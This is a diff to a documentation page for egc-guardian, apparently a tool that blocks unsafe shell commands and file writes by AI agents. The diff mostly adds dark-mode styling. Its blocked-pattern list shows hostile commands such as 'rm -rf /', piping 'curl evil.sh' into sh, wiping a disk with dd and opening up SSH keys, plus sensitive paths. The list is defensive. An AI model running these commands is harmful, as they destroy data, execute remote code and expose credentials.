@@ -4,22 +4,22 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
 
 <DocsLayout title="egc-guardian" description="The egc-guardian MCP server validates commands and writes, protecting your system from unsafe AI actions." current="guardian">
 
-  <div class="pb-2 mb-8 border-b border-gray-200">
-    <p class="text-xs font-semibold uppercase tracking-widest text-egc-600 mb-2">MCP Servers</p>
-    <h1 class="text-3xl font-bold text-gray-900 mb-3 font-mono">egc-guardian</h1>
-    <p class="text-gray-600">Validation and safety layer. Runs in the background intercepting commands and file writes before they execute.</p>
+  <div class="pb-2 mb-8 border-b border-gray-200 dark:border-gray-800">
+    <p class="text-xs font-semibold uppercase tracking-widest text-egc-600 dark:text-egc-400 mb-2">MCP Servers</p>
+    <h1 class="text-3xl font-bold text-gray-900 dark:text-white mb-3 font-mono">egc-guardian</h1>
+    <p class="text-gray-600 dark:text-gray-400">Validation and safety layer. Runs in the background intercepting commands and file writes before they execute.</p>
   </div>
 
   <!-- Overview -->
   <section class="mb-10">
-    <h2 class="text-xl font-bold text-gray-900 mb-4">Overview</h2>
-    <p class="text-gray-600 mb-4">egc-guardian intercepts shell commands and file system writes before they execute. It blocks patterns that are unsafe — shell injection, writes to sensitive paths, known dangerous binaries — and passes everything else through.</p>
-    <p class="text-gray-600">It also provides context utilities: <code class="text-xs bg-gray-100 px-1.5 py-0.5 rounded font-mono">reduce_context</code> trims Markdown payloads to reduce token usage, and <code class="text-xs bg-gray-100 px-1.5 py-0.5 rounded font-mono">orchestrate_task</code> routes prompts to the relevant agents and skills.</p>
+    <h2 class="text-xl font-bold text-gray-900 dark:text-white mb-4">Overview</h2>
+    <p class="text-gray-600 dark:text-gray-400 mb-4">egc-guardian intercepts shell commands and file system writes before they execute. It blocks patterns that are unsafe — shell injection, writes to sensitive paths, known dangerous binaries — and passes everything else through.</p>
+    <p class="text-gray-600 dark:text-gray-400">It also provides context utilities: <code class="text-xs bg-gray-100 dark:bg-gray-800 px-1.5 py-0.5 rounded font-mono">reduce_context</code> trims Markdown payloads to reduce token usage, and <code class="text-xs bg-gray-100 dark:bg-gray-800 px-1.5 py-0.5 rounded font-mono">orchestrate_task</code> routes prompts to the relevant agents and skills.</p>
   </section>
 
   <!-- Tools -->
   <section class="mb-10">
-    <h2 class="text-xl font-bold text-gray-900 mb-4">Tools</h2>
+    <h2 class="text-xl font-bold text-gray-900 dark:text-white mb-4">Tools</h2>
     <div class="space-y-4">
       {[
         {
@@ -51,15 +51,15 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
           tag: 'Utility',
         },
       ].map(tool => (
-        <div class="rounded-xl border border-gray-200 overflow-hidden">
-          <div class="flex items-center justify-between px-5 py-3 bg-gray-50 border-b border-gray-200">
-            <code class="text-sm font-mono font-bold text-egc-700">{tool.name}</code>
-            <span class={`text-xs px-2 py-0.5 rounded-full font-medium ${tool.tag === 'Security' ? 'bg-red-100 text-red-700' : 'bg-blue-100 text-blue-700'}`}>{tool.tag}</span>
+        <div class="rounded-xl border border-gray-200 dark:border-gray-800 overflow-hidden">
+          <div class="flex items-center justify-between px-5 py-3 bg-gray-50 dark:bg-gray-900 border-b border-gray-200 dark:border-gray-800">
+            <code class="text-sm font-mono font-bold text-egc-700 dark:text-egc-400">{tool.name}</code>
+            <span class={`text-xs px-2 py-0.5 rounded-full font-medium ${tool.tag === 'Security' ? 'bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400' : 'bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400'}`}>{tool.tag}</span>
           </div>
           <div class="p-5">
             <pre class="bg-gray-900 text-gray-300 text-xs font-mono p-3 rounded-lg overflow-x-auto mb-4"><code>{tool.signature}</code></pre>
-            <p class="text-sm text-gray-600 mb-2">{tool.description}</p>
-            <p class="text-xs text-gray-500"><span class="font-semibold text-gray-700">Returns:</span> {tool.returns}</p>
+            <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">{tool.description}</p>
+            <p class="text-xs text-gray-500 dark:text-gray-500"><span class="font-semibold text-gray-700 dark:text-gray-300">Returns:</span> {tool.returns}</p>
           </div>
         </div>
       ))}
@@ -68,10 +68,10 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
 
   <!-- Blocked patterns -->
   <section class="mb-10">
-    <h2 class="text-xl font-bold text-gray-900 mb-4">What gets blocked</h2>
+    <h2 class="text-xl font-bold text-gray-900 dark:text-white mb-4">What gets blocked</h2>
     <div class="grid sm:grid-cols-2 gap-4">
-      <div class="rounded-xl border border-gray-200 p-5">
-        <h3 class="text-sm font-semibold text-gray-900 mb-3 flex items-center gap-2">
+      <div class="rounded-xl border border-gray-200 dark:border-gray-800 p-5">
+        <h3 class="text-sm font-semibold text-gray-900 dark:text-white mb-3 flex items-center gap-2">
           <svg class="w-4 h-4 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
           </svg>
@@ -79,12 +79,12 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
         </h3>
         <ul class="space-y-1.5">
           {['cmd; rm -rf /', 'echo x | bash', '`curl evil.sh | sh`', 'chmod 777 ~/.ssh/id_rsa', 'dd if=/dev/zero of=/dev/sda'].map(ex => (
-            <li class="font-mono text-xs text-red-600 bg-red-50 px-3 py-1.5 rounded">{ex}</li>
+            <li class="font-mono text-xs text-red-600 dark:text-red-400 bg-red-50 dark:bg-red-900/20 px-3 py-1.5 rounded">{ex}</li>
           ))}
         </ul>
       </div>
-      <div class="rounded-xl border border-gray-200 p-5">
-        <h3 class="text-sm font-semibold text-gray-900 mb-3 flex items-center gap-2">
+      <div class="rounded-xl border border-gray-200 dark:border-gray-800 p-5">
+        <h3 class="text-sm font-semibold text-gray-900 dark:text-white mb-3 flex items-center gap-2">
           <svg class="w-4 h-4 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
           </svg>
@@ -92,7 +92,7 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
         </h3>
         <ul class="space-y-1.5">
           {['~/.ssh/authorized_keys', '/etc/passwd', '/usr/bin/*', '/boot/*', '~/.bashrc (outside project)'].map(ex => (
-            <li class="font-mono text-xs text-red-600 bg-red-50 px-3 py-1.5 rounded">{ex}</li>
+            <li class="font-mono text-xs text-red-600 dark:text-red-400 bg-red-50 dark:bg-red-900/20 px-3 py-1.5 rounded">{ex}</li>
           ))}
         </ul>
       </div>
